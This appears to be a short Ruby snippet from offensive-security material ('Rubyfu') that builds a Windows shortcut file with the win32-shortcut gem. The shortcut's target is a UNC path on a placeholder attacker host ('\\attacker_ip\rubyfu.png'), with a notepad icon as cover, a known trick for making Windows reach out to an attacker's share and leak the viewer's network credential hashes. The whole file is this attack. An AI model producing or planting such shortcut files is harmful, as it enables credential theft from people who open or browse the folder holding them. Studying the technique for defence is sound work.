require 'win32/shortcut'
include Win32

Shortcut.new("test.lnk") do |s|
    s.description = 'Rubyfu'
    s.path = '\\attacker_ip\rubyfu.png'
    s.show_cmd = Shortcut::SHOWNORMAL
    s.icon_location = 'notepad.exe'
end